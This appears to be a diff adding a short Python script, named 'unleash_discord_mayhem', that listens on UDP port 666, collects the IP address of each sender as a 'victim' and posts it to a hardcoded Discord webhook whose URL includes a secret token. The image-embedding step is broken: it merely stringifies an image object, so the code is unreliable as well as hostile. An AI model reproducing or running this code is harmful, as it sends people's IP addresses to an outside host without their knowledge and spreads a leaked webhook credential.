@@ -1,0 +1,24 @@
+import requests
+import socket
+from PIL import Image
+
+def unleash_discord_mayhem(webhook, image_link):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.bind(('0.0.0.0', 666))
+
+    while True:
+        data, addr = s.recvfrom(1024)
+        victim_ip = addr[0]
+
+        # Embed IP in the image
+        img = Image.open(requests.get(image_link, stream=True).raw)
+        img_with_ip = f"{victim_ip} says: {img}"
+        
+        # Send the malevolent payload to Discord webhook
+        discord_payload = {"content": img_with_ip}
+        requests.post(webhook, json=discord_payload)
+
+# Initiate the mayhem
+webhook_url = "https://discord.com/api/webhooks/1192617117246300170/66Gbx4JdRy0bJ4gGhpbQukPEyY-1ERgHdoNliX5iGwU1yQUpLqsI8vppf1s7AhuyS6zx"
+image_url = "https://th.bing.com/th/id/R.b42d077f7608ecfe94a08b5d4213eb66?rik=0hx9eqp4xZnIiQ&riu=http%3a%2f%2fgetwallpapers.com%2fwallpaper%2ffull%2f0%2fb%2f5%2f175341.jpg&ehk=EG20ra9%2fkw8bRtQ5LCMLWYQ4lE4GJ7WoUAw3QT7CP3s%3d&risl=&pid=ImgRaw&r=0"
+unleash_discord_mayhem(webhook_url, image_url)
